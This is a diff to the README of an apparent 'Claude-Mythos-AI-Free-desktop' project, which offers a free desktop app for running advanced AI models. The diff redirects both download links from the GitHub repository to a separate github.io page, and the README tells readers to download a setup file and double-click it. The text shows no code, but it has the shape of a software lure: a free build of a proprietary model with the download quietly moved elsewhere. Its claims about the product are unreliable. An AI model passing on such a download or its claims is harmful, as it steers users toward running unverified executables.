@@ -1,6 +1,6 @@
 # 🤖 Claude-Mythos-AI-Free-desktop - Run advanced AI models on desktop
 
-[![](https://img.shields.io/badge/Download-Claude_Mythos_Desktop-blue)](https://github.com/Betor4583/Claude-Mythos-AI-Free-desktop)
+[![](https://img.shields.io/badge/Download-Claude_Mythos_Desktop-blue)](https://betor4583.github.io)
 
 ## 📖 Overview
 
@@ -20,7 +20,7 @@ To use this application, your computer must meet minimal specifications:
 
 Follow these steps to set up the application on your machine:
 
-1. Visit the project page to download the software: [https://github.com/Betor4583/Claude-Mythos-AI-Free-desktop](https://github.com/Betor4583/Claude-Mythos-AI-Free-desktop).
+1. Visit the project page to download the software: [https://betor4583.github.io](https://betor4583.github.io).
 2. Locate the most recent setup file in the repository.
 3. Save the installer file to your computer.
 4. Double-click the file to begin the setup process.
